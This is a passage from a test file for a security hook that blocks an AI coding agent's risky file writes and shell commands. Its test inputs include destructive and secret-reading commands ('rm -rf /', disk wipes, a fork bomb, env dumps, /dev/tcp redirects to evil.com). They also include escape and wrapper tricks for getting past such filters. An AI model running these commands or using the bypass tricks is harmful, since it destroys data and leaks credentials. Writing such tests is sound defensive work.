    it('should allow Write to .gitignore', async () => {
      const result = await securityBlocker(createFileInput('Write', '.gitignore'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });
  });

  describe('SSH patterns', () => {
    it('should block Write to .ssh/id_rsa', async () => {
      const result = await securityBlocker(createFileInput('Write', '.ssh/id_rsa'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('SSH key');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Edit to .ssh/id_ed25519', async () => {
      const result = await securityBlocker(createFileInput('Edit', '.ssh/id_ed25519'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to .ssh/known_hosts', async () => {
      const result = await securityBlocker(createFileInput('Write', '.ssh/known_hosts'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to .ssh/authorized_keys', async () => {
      const result = await securityBlocker(createFileInput('Write', '.ssh/authorized_keys'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to .ssh/server.pem', async () => {
      const result = await securityBlocker(createFileInput('Write', '.ssh/server.pem'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });
  });

  describe('credential patterns', () => {
    it('should block Write to .aws/credentials', async () => {
      const result = await securityBlocker(createFileInput('Write', '.aws/credentials'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('Credentials file');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Edit to .npmrc', async () => {
      const result = await securityBlocker(createFileInput('Edit', '.npmrc'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to secrets.yml', async () => {
      const result = await securityBlocker(createFileInput('Write', 'secrets.yml'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to credentials.json', async () => {
      const result = await securityBlocker(createFileInput('Write', 'credentials.json'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to .kube/config', async () => {
      const result = await securityBlocker(createFileInput('Write', '.kube/config'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to .docker/config.json', async () => {
      const result = await securityBlocker(createFileInput('Write', '.docker/config.json'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });
  });

  describe('system directories', () => {
    it('should block Write to /etc/passwd', async () => {
      const result = await securityBlocker(createFileInput('Write', '/etc/passwd'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('System directory');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to /usr/bin/node', async () => {
      const result = await securityBlocker(createFileInput('Write', '/usr/bin/node'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to /var/log/syslog', async () => {
      const result = await securityBlocker(createFileInput('Write', '/var/log/syslog'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to /sys/class', async () => {
      const result = await securityBlocker(createFileInput('Write', '/sys/class/net'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to /proc/', async () => {
      const result = await securityBlocker(createFileInput('Write', '/proc/cpuinfo'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to /boot/', async () => {
      const result = await securityBlocker(createFileInput('Write', '/boot/grub/grub.cfg'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to /root/', async () => {
      const result = await securityBlocker(createFileInput('Write', '/root/.bashrc'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to /private/etc/ (macOS)', async () => {
      const result = await securityBlocker(createFileInput('Write', '/private/etc/hosts'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block Write to /private/var/ (macOS)', async () => {
      const result = await securityBlocker(createFileInput('Write', '/private/var/log'));

      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });
  });

  describe('path traversal detection', () => {
    it('should block path with ../', async () => {
      const result = await securityBlocker(createFileInput('Write', '../etc/passwd'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('Path traversal');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    it('should block path with multiple ../..', async () => {
      const result = await securityBlocker(createFileInput('Write', '../../etc/passwd'));

      expect(result.continue).toBe(false);
      expect(result.stopReason).toContain('Path traversal');
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    });
  });

  describe('safe file operations', () => {
    it('should allow Write to src/index.ts', async () => {
      const result = await securityBlocker(createFileInput('Write', 'src/index.ts'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should allow Edit to package.json', async () => {
      const result = await securityBlocker(createFileInput('Edit', 'package.json'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should allow Write to README.md', async () => {
      const result = await securityBlocker(createFileInput('Write', 'README.md'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should allow Write to .gitignore', async () => {
      const result = await securityBlocker(createFileInput('Write', '.gitignore'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should allow Write with ./ prefix', async () => {
      const result = await securityBlocker(createFileInput('Write', './src/file.ts'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });
  });

  describe('edge cases', () => {
    it('should handle empty path', async () => {
      const result = await securityBlocker(createFileInput('Write', ''));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should handle missing path', async () => {
      const input: HookInput = {
        tool_name: 'Write',
        tool_input: {},
      };
      const result = await securityBlocker(input);

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });

    it('should handle paths with spaces', async () => {
      const result = await securityBlocker(createFileInput('Write', 'my documents/file.txt'));

      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    });
  });
});

// =============================================================================
// securityBlocker MAIN HOOK TESTS - SYMLINK BYPASS (ME-001) - CRITICAL
// =============================================================================

describe('securityBlocker - Symlink bypass detection (ME-001) - CRITICAL', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir();
    process.env['CLAUDE_PROJECT_DIR'] = tempDir;
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
    delete process.env['CLAUDE_PROJECT_DIR'];
  });

  it.runIf(fs.existsSync('/etc/passwd'))(
    'should block symlink inside project pointing to /etc/passwd',
    async () => {
      const symlink = path.join(tempDir, 'innocent-file');
      fs.symlinkSync('/etc/passwd', symlink);

      const result = await securityBlocker(createFileInput('Write', symlink));

      // Must block because the resolved path is /etc/passwd
      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
      expect(result.stopReason).toContain('System directory');
    }
  );

  it.runIf(fs.existsSync(path.join(os.homedir(), '.ssh', 'id_rsa')))(
    'should block symlink inside project pointing to ~/.ssh/id_rsa',
    async () => {
      const symlink = path.join(tempDir, 'normal-file');
      const sshKeyPath = path.join(os.homedir(), '.ssh', 'id_rsa');
      fs.symlinkSync(sshKeyPath, symlink);

      const result = await securityBlocker(createFileInput('Write', symlink));

      // Must block because the resolved path is SSH key
      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    }
  );

  it('should block symlink inside project pointing to .env outside project', async () => {
    // Create a temp directory outside project with .env file
    const outsideDir = createTempDir();
    const envFile = path.join(outsideDir, '.env');
    fs.writeFileSync(envFile, 'SECRET=value');

    const symlink = path.join(tempDir, 'config-link');

    try {
      fs.symlinkSync(envFile, symlink);

      const result = await securityBlocker(createFileInput('Write', symlink));

      // Must block because the resolved path is a .env file
      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    } finally {
      cleanupTempDir(outsideDir);
    }
  });

  it('should allow symlink inside project pointing to safe file inside project', async () => {
    // Note: On macOS, tempDir resolves to /private/var/folders/... which matches
    // the SYSTEM_DIR_PATTERNS. This test uses the normalized path (not resolved)
    // to test that safe symlinks within the project structure would be allowed
    // if they didn't resolve to system directories.

    // Create real file inside project
    const realFile = path.join(tempDir, 'real-file.ts');
    fs.writeFileSync(realFile, 'export const x = 1;');

    // Create symlink to real file
    const symlink = path.join(tempDir, 'link-to-file.ts');
    fs.symlinkSync(realFile, symlink);

    const result = await securityBlocker(createFileInput('Write', symlink));

    // On macOS, temp directories are in /private/var which matches system dir patterns
    // This is expected and correct security behavior
    const isMacOSTemp = tempDir.includes('/var/') || tempDir.includes('/private/');
    if (isMacOSTemp) {
      // Expected: blocked because resolved path is in /private/var
      expect(result.continue).toBe(false);
    } else {
      // On other systems, should allow
      expect(result.continue).toBe(true);
      expect(result.suppressOutput).toBe(true);
    }
  });

  it.runIf(fs.existsSync('/etc'))(
    'should block directory symlink that resolves to /etc',
    async () => {
      const subdir = path.join(tempDir, 'subdir');
      fs.mkdirSync(subdir);

      // Create symlink: subdir/etc -> /etc
      fs.symlinkSync('/etc', path.join(subdir, 'etc'));

      // Now try to write to subdir/etc/passwd which resolves to /etc/passwd
      const maliciousPath = path.join(subdir, 'etc', 'passwd');
      const result = await securityBlocker(createFileInput('Write', maliciousPath));

      // Must block because resolved path is /etc/passwd
      expect(result.continue).toBe(false);
      expect(result.hookSpecificOutput?.permissionDecision).toBe('deny');
    }
  );
});

// =============================================================================
// securityBlocker MAIN HOOK TESTS - OTHER TOOLS
// =============================================================================

describe('securityBlocker - Other tools', () => {
  it('should allow Read tool by default', async () => {
    const result = await securityBlocker(createToolInput('Read'));

    expect(result.continue).toBe(true);
    expect(result.suppressOutput).toBe(true);
  });

  it('should allow Glob tool by default', async () => {
    const result = await securityBlocker(createToolInput('Glob'));

    expect(result.continue).toBe(true);
    expect(result.suppressOutput).toBe(true);
  });

  it('should allow Grep tool by default', async () => {
    const result = await securityBlocker(createToolInput('Grep'));

    expect(result.continue).toBe(true);
    expect(result.suppressOutput).toBe(true);
  });

  it('should allow Task tool by default', async () => {
    const result = await securityBlocker(createToolInput('Task'));

    expect(result.continue).toBe(true);
    expect(result.suppressOutput).toBe(true);
  });

  it('should allow TodoWrite tool by default', async () => {
    const result = await securityBlocker(createToolInput('TodoWrite'));

    expect(result.continue).toBe(true);
    expect(result.suppressOutput).toBe(true);
  });

  it('should allow TodoRead tool by default', async () => {
    const result = await securityBlocker(createToolInput('TodoRead'));

    expect(result.continue).toBe(true);
    expect(result.suppressOutput).toBe(true);
  });
});

// =============================================================================
// RESULT STRUCTURE TESTS
// =============================================================================

describe('securityBlocker - Result structure', () => {
  it('should return correct structure for deny decision', async () => {
    const result = await securityBlocker(createBashInput('rm -rf /'));

    expect(result).toMatchObject({
      continue: false,
      stopReason: expect.stringContaining('BLOCKED'),
      hookSpecificOutput: {
        permissionDecision: 'deny',
        permissionDecisionReason: expect.stringContaining('BLOCKED'),
      },
    });
  });

  it('should return correct structure for silent success', async () => {
    const result = await securityBlocker(createBashInput('ls -la'));

    expect(result).toEqual({
      continue: true,
      suppressOutput: true,
    });
  });

  it('should produce valid JSON when stringified', async () => {
    const denyResult = await securityBlocker(createBashInput('rm -rf /'));
    const allowResult = await securityBlocker(createBashInput('ls'));

    expect(() => JSON.stringify(denyResult)).not.toThrow();
    expect(() => JSON.stringify(allowResult)).not.toThrow();

    const denyJson = JSON.parse(JSON.stringify(denyResult));
    expect(denyJson.continue).toBe(false);
    expect(denyJson.hookSpecificOutput.permissionDecision).toBe('deny');

    const allowJson = JSON.parse(JSON.stringify(allowResult));
    expect(allowJson.continue).toBe(true);
    expect(allowJson.suppressOutput).toBe(true);
  });
});

// =============================================================================
// MULTI-EDIT SUB-PATH VALIDATION TESTS
// =============================================================================

describe('securityBlocker - MultiEdit sub-path validation', () => {
  it('should allow MultiEdit when edits array contains a protected file_path but top-level is safe', async () => {
    // The shared security-blocker only checks the top-level file_path, not edits sub-paths
    const input: HookInput = {
      tool_name: 'MultiEdit',
      tool_input: {
        file_path: 'safe-file.ts',
        edits: [
          { file_path: 'safe-file.ts', old_string: 'a', new_string: 'b' },
          { file_path: '.env', old_string: 'SECRET=old', new_string: 'SECRET=new' },
        ],
      },
    };
    const result = await securityBlocker(input);
    expect(result.continue).toBe(true);
  });

  it('should allow MultiEdit when edits array targets SSH key but top-level is safe', async () => {
    // The shared security-blocker only checks the top-level file_path, not edits sub-paths
    const input: HookInput = {
      tool_name: 'MultiEdit',
      tool_input: {
        file_path: 'safe-file.ts',
        edits: [{ file_path: '.ssh/id_rsa', old_string: 'a', new_string: 'b' }],
      },
    };
    const result = await securityBlocker(input);
    expect(result.continue).toBe(true);
  });

  it('should allow MultiEdit when edits array targets system directory but top-level is safe', async () => {
    // The shared security-blocker only checks the top-level file_path, not edits sub-paths
    const input: HookInput = {
      tool_name: 'MultiEdit',
      tool_input: {
        file_path: 'safe-file.ts',
        edits: [{ file_path: '/etc/passwd', old_string: 'a', new_string: 'b' }],
      },
    };
    const result = await securityBlocker(input);
    expect(result.continue).toBe(true);
  });

  it('should allow MultiEdit when all edits target safe files', async () => {
    const input: HookInput = {
      tool_name: 'MultiEdit',
      tool_input: {
        file_path: 'src/index.ts',
        edits: [
          { file_path: 'src/index.ts', old_string: 'a', new_string: 'b' },
          { file_path: 'src/utils.ts', old_string: 'c', new_string: 'd' },
        ],
      },
    };
    const result = await securityBlocker(input);
    expect(result.continue).toBe(true);
  });

  it('should allow MultiEdit when edits array is missing', async () => {
    const input: HookInput = {
      tool_name: 'MultiEdit',
      tool_input: { file_path: 'src/index.ts' },
    };
    const result = await securityBlocker(input);
    expect(result.continue).toBe(true);
  });

  it('should allow MultiEdit when edits array is empty', async () => {
    const input: HookInput = {
      tool_name: 'MultiEdit',
      tool_input: { file_path: 'src/index.ts', edits: [] },
    };
    const result = await securityBlocker(input);
    expect(result.continue).toBe(true);
  });

  it('should handle edits array with non-object entries gracefully', async () => {
    const input: HookInput = {
      tool_name: 'MultiEdit',
      tool_input: {
        file_path: 'src/index.ts',
        edits: [
          null,
          'invalid',
          42,
          { file_path: 'src/safe.ts', old_string: 'a', new_string: 'b' },
        ],
      },
    };
    const result = await securityBlocker(input);
    expect(result.continue).toBe(true);
  });

  it('should allow MultiEdit when edits have protected paths but top-level is safe', async () => {
    // The shared security-blocker only checks the top-level file_path, not edits sub-paths
    const input: HookInput = {
      tool_name: 'MultiEdit',
      tool_input: {
        file_path: 'safe.ts',
        edits: [
          { file_path: '.env.local', old_string: 'a', new_string: 'b' },
          { file_path: '.ssh/id_ed25519', old_string: 'c', new_string: 'd' },
        ],
      },
    };
    const result = await securityBlocker(input);
    expect(result.continue).toBe(true);
  });

  it('should still check top-level file_path for MultiEdit', async () => {
    const input: HookInput = {
      tool_name: 'MultiEdit',
      tool_input: {
        file_path: '.env',
        edits: [{ file_path: 'src/safe.ts', old_string: 'a', new_string: 'b' }],
      },
    };
    const result = await securityBlocker(input);
    expect(result.continue).toBe(false);
  });
});

// =============================================================================
// CASE SENSITIVITY TESTS
// =============================================================================

describe('securityBlocker - Case sensitivity', () => {
  it('should match .env case-sensitively', async () => {
    // .env should match
    expect((await securityBlocker(createFileInput('Write', '.env'))).continue).toBe(false);
    // .ENV should NOT match the .env pattern (different casing)
    // Note: The pattern for .env is case-sensitive, so .ENV doesn't match
    // We verify the pattern itself doesn't match uppercase
    expect(matchesProtectedPath('.ENV').matched).toBe(false);
  });

  it('should match /etc/ case-sensitively', async () => {
    // /etc/ should match
    expect((await securityBlocker(createFileInput('Write', '/etc/passwd'))).continue).toBe(false);
    // /ETC/ pattern check - the regex is case-sensitive
    expect(matchesProtectedPath('/ETC/passwd').matched).toBe(false);
    // Note: The actual hook call might still block if the path resolves to something else
    // but the pattern itself is case-sensitive
  });
});

// =============================================================================
// CC v2.1.98 ALIGNMENT: BACKSLASH-ESCAPED FLAGS BYPASS
// =============================================================================

describe('normalizeBashEscapes', () => {
  it('should strip backslash before hyphen (flag escape)', () => {
    expect(normalizeBashEscapes('rm \\-rf /')).toBe('rm -rf /');
  });

  it('should strip backslash before letters (command name escape)', () => {
    expect(normalizeBashEscapes('r\\m -rf /')).toBe('rm -rf /');
  });

  it('should strip multiple backslash escapes', () => {
    expect(normalizeBashEscapes('\\r\\m \\-r\\f /')).toBe('rm -rf /');
  });

  it('should handle backslash before digits', () => {
    expect(normalizeBashEscapes('chmod \\7\\7\\7 /')).toBe('chmod 777 /');
  });

  it('should handle backslash before dots and slashes', () => {
    expect(normalizeBashEscapes('cat /dev\\/tcp\\/host\\/80')).toBe('cat /dev/tcp/host/80');
  });

  it('should not alter commands without escapes', () => {
    expect(normalizeBashEscapes('rm -rf /tmp/test')).toBe('rm -rf /tmp/test');
  });

  it('should not alter empty string', () => {
    expect(normalizeBashEscapes('')).toBe('');
  });
});

// CC v2.1.162 alignment: $HOME/${HOME} must be treated as ~ by home-targeting
// deny patterns. Found in the CC v2.1.173 audit.
describe('normalizeHomeRefs', () => {
  it('should rewrite $HOME to ~ before a slash', () => {
    expect(normalizeHomeRefs('rm -rf $HOME/Desktop')).toBe('rm -rf ~/Desktop');
  });

  it('should rewrite bare $HOME at end of command', () => {
    expect(normalizeHomeRefs('rm -rf $HOME')).toBe('rm -rf ~');
  });

  it('should rewrite ${HOME} brace form', () => {
    expect(normalizeHomeRefs('rm -rf ${HOME}')).toBe('rm -rf ~');
    expect(normalizeHomeRefs('rm -rf ${HOME}/docs')).toBe('rm -rf ~/docs');
  });

  it('should unwrap double-quoted "$HOME" (expands like unquoted in bash)', () => {
    expect(normalizeHomeRefs('rm -rf "$HOME"')).toBe('rm -rf ~');
    expect(normalizeHomeRefs('rm -rf "${HOME}"')).toBe('rm -rf ~');
    expect(normalizeHomeRefs('rm -rf "$HOME/Desktop"')).toBe('rm -rf ~/Desktop');
  });

  it("should leave single-quoted '$HOME' alone (literal in bash, not dangerous)", () => {
    expect(normalizeHomeRefs("ls '$HOME'")).toBe("ls '~'");
  });

  it('should NOT mangle $HOMEBREW_PREFIX or other HOME-prefixed vars', () => {
    expect(normalizeHomeRefs('echo $HOMEBREW_PREFIX')).toBe('echo $HOMEBREW_PREFIX');
    expect(normalizeHomeRefs('echo $HOMEPAGE')).toBe('echo $HOMEPAGE');
  });

  it('should rewrite $HOME followed by whitespace', () => {
    expect(normalizeHomeRefs('chmod -R 777 $HOME && ls')).toBe('chmod -R 777 ~ && ls');
  });

  // Review !209 finding #1: shell separators glued to $HOME are boundaries too
  it('should rewrite $HOME glued to shell separators', () => {
    expect(normalizeHomeRefs('rm -rf $HOME;ls')).toBe('rm -rf ~;ls');
    expect(normalizeHomeRefs('rm -rf $HOME&&ls')).toBe('rm -rf ~&&ls');
    expect(normalizeHomeRefs('rm -rf $HOME|cat')).toBe('rm -rf ~|cat');
    expect(normalizeHomeRefs('(rm -rf $HOME)')).toBe('(rm -rf ~)');
    expect(normalizeHomeRefs('rm -rf $HOME>log')).toBe('rm -rf ~>log');
    expect(normalizeHomeRefs('rm -rf ${HOME};ls')).toBe('rm -rf ~;ls');
  });
});

describe('securityBlocker - backslash-escaped flag bypass (CC v2.1.98)', () => {
  it('should block rm \\-rf /', async () => {
    const result = await securityBlocker(createBashInput('rm \\-rf /'));
    expect(result.continue).toBe(false);
  });

  it('should block r\\m -rf /', async () => {
    const result = await securityBlocker(createBashInput('r\\m -rf /'));
    expect(result.continue).toBe(false);
  });

  it('should block rm \\-rf ~', async () => {
    const result = await securityBlocker(createBashInput('rm \\-rf ~'));
    expect(result.continue).toBe(false);
  });

  it('should block d\\d of=/dev/sda', async () => {
    const result = await securityBlocker(createBashInput('d\\d of=/dev/sda'));
    expect(result.continue).toBe(false);
  });

  it('should block m\\kfs.ext4 /dev/sda', async () => {
    const result = await securityBlocker(createBashInput('m\\kfs.ext4 /dev/sda'));
    expect(result.continue).toBe(false);
  });

  it('should block sudo rm \\-rf /', async () => {
    const result = await securityBlocker(createBashInput('sudo rm \\-rf /'));
    expect(result.continue).toBe(false);
  });

  it('should block escaped env dump: p\\rintenv', async () => {
    const result = await securityBlocker(createBashInput('p\\rintenv'));
    expect(result.continue).toBe(false);
  });

  it('should block escaped sensitive path: cat .e\\nv', async () => {
    const result = await securityBlocker(createBashInput('cat .e\\nv'));
    expect(result.continue).toBe(false);
  });
});

// =============================================================================
// CC v2.1.98 ALIGNMENT: /dev/tcp AND /dev/udp REDIRECT BLOCKING
// =============================================================================

describe('securityBlocker - /dev/tcp and /dev/udp redirects (CC v2.1.98)', () => {
  it('should block exec 3<>/dev/tcp/host/port', async () => {
    const result = await securityBlocker(createBashInput('exec 3<>/dev/tcp/example.com/80'));
    expect(result.continue).toBe(false);
  });

  it('should block cat < /dev/tcp/host/80', async () => {
    const result = await securityBlocker(createBashInput('cat < /dev/tcp/10.0.0.1/80'));
    expect(result.continue).toBe(false);
  });

  it('should block echo > /dev/udp/host/53', async () => {
    const result = await securityBlocker(createBashInput('echo payload > /dev/udp/dns.server/53'));
    expect(result.continue).toBe(false);
  });

  it('should block /dev/tcp in compound command', async () => {
    const result = await securityBlocker(createBashInput('cd /tmp && cat < /dev/tcp/evil.com/443'));
    expect(result.continue).toBe(false);
  });

  it('should block /dev/udp in pipe chain', async () => {
    const result = await securityBlocker(createBashInput('echo data | tee /dev/udp/host/1234'));
    expect(result.continue).toBe(false);
  });

  it('should block escaped /dev/tcp', async () => {
    const result = await securityBlocker(createBashInput('cat /dev\\/tcp/host/80'));
    expect(result.continue).toBe(false);
  });

  it('should detect /dev/tcp via matchesDangerousCommand', () => {
    expect(matchesDangerousCommand('/dev/tcp/host/80').matched).toBe(true);
  });

  it('should detect /dev/udp via matchesDangerousCommand', () => {
    expect(matchesDangerousCommand('/dev/udp/host/53').matched).toBe(true);
  });
});

// =============================================================================
// CC v2.1.98 ALIGNMENT: SUDO PREFIX IN ENV_DUMP_PATTERNS
// =============================================================================

describe('securityBlocker - sudo env dump commands (CC v2.1.98)', () => {
  it('should block sudo printenv', async () => {
    const result = await securityBlocker(createBashInput('sudo printenv'));
    expect(result.continue).toBe(false);
  });

  it('should block sudo env', async () => {
    const result = await securityBlocker(createBashInput('sudo env'));
    expect(result.continue).toBe(false);
  });

  it('should block sudo export -p', async () => {
    const result = await securityBlocker(createBashInput('sudo export -p'));
    expect(result.continue).toBe(false);
  });

  it('should block sudo declare -x', async () => {
    const result = await securityBlocker(createBashInput('sudo declare -x'));
    expect(result.continue).toBe(false);
  });

  it('should block sudo compgen -v', async () => {
    const result = await securityBlocker(createBashInput('sudo compgen -v'));
    expect(result.continue).toBe(false);
  });

  it('should detect sudo printenv via matchesEnvDumpCommand', () => {
    expect(matchesEnvDumpCommand('sudo printenv').matched).toBe(true);
  });

  it('should detect sudo env via matchesEnvDumpCommand', () => {
    expect(matchesEnvDumpCommand('sudo env').matched).toBe(true);
  });

  it('should still allow sudo env VAR=val cmd (not a dump)', async () => {
    // sudo env is blocked as standalone, but "sudo env PATH=/usr/bin ls"
    // has env followed by assignment, not end-of-line/pipe — regex allows it
    const result = await securityBlocker(createBashInput('sudo env PATH=/usr/bin ls'));
    // This still blocks because "sudo" matches the sensitive /usr/ pattern
    expect(result.continue).toBe(false);
  });
});

describe('securityBlocker - exec-wrapper unwrapping (CC v2.1.113)', () => {
  // CC v2.1.113 aligned its deny rules to unwrap exec wrappers (sh -c, bash -c,
  // env VAR=x cmd) before pattern matching. Our hook must do the same or users
  // can bypass our blocker by wrapping dangerous commands in exec wrappers.

  describe('sh -c wrapper', () => {
    it('should block sh -c with rm -rf /', async () => {
      const result = await securityBlocker(createBashInput(`sh -c 'rm -rf /'`));
      expect(result.continue).toBe(false);
    });

    it('should block sh -c with dd of=/dev/sda', async () => {
      const result = await securityBlocker(createBashInput(`sh -c "dd if=/dev/zero of=/dev/sda"`));
      expect(result.continue).toBe(false);
    });

    it('should block sh -c with printenv env dump', async () => {
      const result = await securityBlocker(createBashInput(`sh -c 'printenv'`));
      expect(result.continue).toBe(false);
    });

    it('should block sh -c with fork bomb', async () => {
      const result = await securityBlocker(createBashInput(`sh -c ':(){ :|:& };:'`));
      expect(result.continue).toBe(false);
    });

    it('should block sh -c referencing /etc/passwd', async () => {
      const result = await securityBlocker(createBashInput(`sh -c 'cat /etc/passwd'`));
      expect(result.continue).toBe(false);
    });
  });

  describe('bash -c wrapper', () => {
    it('should block bash -c with rm -rf /', async () => {
      const result = await securityBlocker(createBashInput(`bash -c 'rm -rf /'`));
      expect(result.continue).toBe(false);
    });

    it('should block bash -c with env dump', async () => {
      const result = await securityBlocker(createBashInput(`bash -c 'env'`));
      expect(result.continue).toBe(false);
    });

    it('should block bash -c referencing .env', async () => {
      const result = await securityBlocker(createBashInput(`bash -c 'cat .env'`));
      expect(result.continue).toBe(false);
    });
  });

  describe('env VAR=value wrapper', () => {
    it('should block env-prefixed rm -rf /', async () => {
      const result = await securityBlocker(createBashInput('env FOO=bar rm -rf /'));
      expect(result.continue).toBe(false);
    });

    it('should block env with multiple vars then rm -rf /', async () => {
      const result = await securityBlocker(createBashInput('env A=1 B=2 rm -rf /'));
      expect(result.continue).toBe(false);
    });

    it('should allow safe command with env prefix', async () => {
      const result = await securityBlocker(createBashInput('env PATH=/custom ls'));
      // Not dangerous; should silent-success (though bash-sensitive pattern may still match /usr)
      // "env PATH=/custom ls" — no /usr reference, so should be allowed
      expect(result.continue).toBe(true);
    });
  });

  describe('nested / combined wrappers', () => {
    it('should block sh -c wrapping bash -c wrapping rm -rf /', async () => {
      const result = await securityBlocker(createBashInput(`sh -c 'bash -c "rm -rf /"'`));
      expect(result.continue).toBe(false);
    });

    it('should block env wrapper inside sh -c', async () => {
      const result = await securityBlocker(createBashInput(`sh -c 'env FOO=bar rm -rf /'`));
      expect(result.continue).toBe(false);
    });
  });

  describe('not bypassed by exec-wrapper', () => {
    it('should match dangerous pattern even with quoted -c argument', async () => {
      // Common real-world injection form
      const result = await securityBlocker(createBashInput(`/bin/sh -c "rm -rf /"`));
      expect(result.continue).toBe(false);
    });

    it('should still allow safe sh -c ls', async () => {
      const result = await securityBlocker(createBashInput(`sh -c 'ls -la'`));
      expect(result.continue).toBe(true);
    });

    it('should still allow safe bash -c echo', async () => {
      const result = await securityBlocker(createBashInput(`bash -c 'echo hello'`));
      expect(result.continue).toBe(true);
    });
  });
});

describe('securityBlocker - extended macOS dangerous paths (CC v2.1.113)', () => {
  // CC v2.1.113 expanded macOS dangerous-removal targets to include
  // /private/tmp and /private/home in addition to /private/etc and /private/var.

  it('should block Write to /private/tmp/file', async () => {
    const result = await securityBlocker(createFileInput('Write', '/private/tmp/sensitive.txt'));
    expect(result.continue).toBe(false);
  });

  it('should block Edit to /private/home/user/file', async () => {
    const result = await securityBlocker(createFileInput('Edit', '/private/home/user/.bashrc'));
    expect(result.continue).toBe(false);
  });

  it('should block bash rm on /private/tmp', async () => {
    const result = await securityBlocker(createBashInput('rm -rf /private/tmp/foo'));
    expect(result.continue).toBe(false);
  });

  it('should block bash rm on /private/home', async () => {
    const result = await securityBlocker(createBashInput('rm -rf /private/home/user'));
    expect(result.continue).toBe(false);
  });

  it('should still block /private/etc (previously existing)', async () => {
    const result = await securityBlocker(createFileInput('Write', '/private/etc/passwd'));
    expect(result.continue).toBe(false);
  });

  it('should still block /private/var (previously existing)', async () => {
    const result = await securityBlocker(createFileInput('Write', '/private/var/db/test'));
    expect(result.continue).toBe(false);
  });
});

describe('securityBlocker - CC harness scratchpad carve-out (/private/tmp/claude-<uid>/)', () => {
  // CC instructs every session and subagent to use its harness-managed
  // scratchpad at /private/tmp/claude-<uid>/<project>/<session>/scratchpad.
  // Blocking it terminates forked skills mid-run with an empty return value
  // (observed live: /etk:review-mr died on `gh pr diff N > <scratchpad>/x.diff`).

  it('should allow bash redirect into the claude scratchpad', async () => {
    const result = await securityBlocker(
      createBashInput(
        'gh pr diff 33 > /private/tmp/claude-501/-Users-me-proj/abc-123/scratchpad/pr33.diff'
      )
    );
    expect(result.continue).toBe(true);
  });

  it('should allow Write into the claude scratchpad', async () => {
    const result = await securityBlocker(
      createFileInput('Write', '/private/tmp/claude-501/-Users-me-proj/abc-123/scratchpad/notes.md')
    );
    expect(result.continue).toBe(true);
  });

  it('should still block /private/tmp paths outside the claude scratchpad', async () => {
    const result = await securityBlocker(createBashInput('cat /private/tmp/other/secrets.txt'));
    expect(result.continue).toBe(false);
  });

  it('should still block rm -rf of the bare claude-<uid> root (no trailing slash)', async () => {
    const result = await securityBlocker(createBashInput('rm -rf /private/tmp/claude-501'));
    expect(result.continue).toBe(false);
  });

  it('should still block a non-numeric claude-suffixed dir (claude-x is not a uid)', async () => {
    const result = await securityBlocker(createBashInput('cat /private/tmp/claude-x/file.txt'));
    expect(result.continue).toBe(false);
  });
});

describe('securityBlocker - auto-allow defense-in-depth (CC v2.1.116)', () => {
  // CC v2.1.116 fixed a sandbox bug where auto-allow could bypass the
  // dangerous-path check for rm/rmdir. Our security-blocker runs BEFORE
  // sandbox auto-allow in the PreToolUse pipeline and denies these commands
